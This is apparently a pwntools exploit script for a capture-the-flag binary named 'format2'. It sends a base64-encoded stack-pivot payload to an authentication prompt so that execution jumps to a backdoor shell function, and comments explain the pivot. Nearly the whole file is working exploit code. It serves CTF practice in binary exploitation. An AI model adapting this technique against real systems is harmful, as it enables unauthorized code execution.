
from pwn import *
from ctypes import *
from LibcSearcher import *
import  base64
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='i386', log_level='debug')

# io = remote("111.200.241.244",64830)
io = process("./format2")
# libc = ELF('./libc.so')
gdb.attach(io)
# io.recv()
## stack leak change main rbp address = input , then main ret = [input]+4 ,just backdoor address seted
#mov esp,ebp  ;esp = input_addr
#pop ebp  ;ebp = aaaa
#retn ; call getshell_addr
backdoor = 0x08049284
input = 0x0811EB40
payload = 'aaaa' + p32(backdoor) + p32(input)
io.recvuntil('Authenticate : ')
io.sendline(base64.b64encode(payload))
pause()


io.interactive()
